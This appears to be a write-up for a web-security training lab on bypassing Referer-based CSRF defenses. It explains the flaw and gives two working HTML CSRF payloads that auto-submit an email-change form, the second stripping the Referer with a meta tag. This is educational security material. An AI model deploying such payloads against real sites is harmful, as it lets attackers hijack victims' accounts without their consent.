
---

## Bypassing Referer-based CSRF defenses

Aside from defenses that employ CSRF tokens, some applications make use of the HTTP `Referer` header to attempt to defend against CSRF attacks, normally by verifying that the request originated from the application's own domain. This approach is generally less effective and is often subject to bypasses.

The HTTP Referer header  (which is inadvertently misspelled in the HTTP specification) is an optional request header that contains the URL of the web page that linked to the resource that is being requested. It is generally added automatically by browsers when a user triggers an HTTP request, including by clicking a link or submitting a form. Various methods exist that allow the linking page to withhold or modify the value of the `Referer` header. This is often done for privacy reasons.

## Validation of Referer depends on header being present

Some applications validate the `Referer` header when it is present in requests but skip the validation if the header is omitted.

In this situation, an attacker can craft their CSRF exploit in a way that causes the victim user's browser to drop the `Referer` header in the resulting request. There are various ways to achieve this, but the easiest is using a META tag within the HTML page that hosts the CSRF attack: `<meta name="referrer" content="never">`


## Lab: CSRF where Referer validation depends on header being present

This lab's email change functionality is vulnerable to CSRF. It attempts to block cross domain requests but has an insecure fallback.

To solve the lab, use your exploit server to host an HTML page that uses a CSRF attack to change the viewer's email address.

You can log in to your own account using the following credentials: `wiener:peter`

We will login using our credentials. We will attempt to change the email address of our user and capture that request. We will notice that there is no CSRF token to protect this request. We will also notice that the HTTP Referer has the same domain as the Origin which is web-security-academy.net. 

Now, we will try to send our exploit that changes the user's email address as usual: 
```html
<form action="https://LAB-ID.web-security-academy.net/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="pwned1@evil-user.net" />
    </form>
    <script>
      document.forms[0].submit();
    </script>
```
If we sent this request, we will get this error message: "Invalid referer header"

Our exploit didn't work, but we will to force the browser to drop the HTTP Referer by adding this part: `<meta name="referrer" content="never">`. So, our exploit will be like this: 
```html
<form action="https://LAB-ID.web-security-academy.net/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="pwned1@evil-user.net" />
      <meta name="referrer" content="never">
    </form>
    <script>
      document.forms[0].submit();
    </script>
```
This exploit will change the user's email address.

